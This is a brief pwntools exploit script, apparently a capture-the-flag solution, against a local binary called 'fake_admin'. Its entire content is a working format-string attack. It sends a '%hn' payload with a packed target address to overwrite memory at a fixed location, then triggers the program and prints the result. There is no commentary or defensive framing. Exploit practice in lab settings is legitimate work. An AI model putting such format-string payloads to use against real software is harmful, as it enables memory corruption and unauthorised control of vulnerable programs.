from pwn import *


p = process('fake_admin')
p.sendline('w')
p.sendline('%4916x    %19$hn' + p64(0x6020B8))
p.sendline('v')
print p.recv()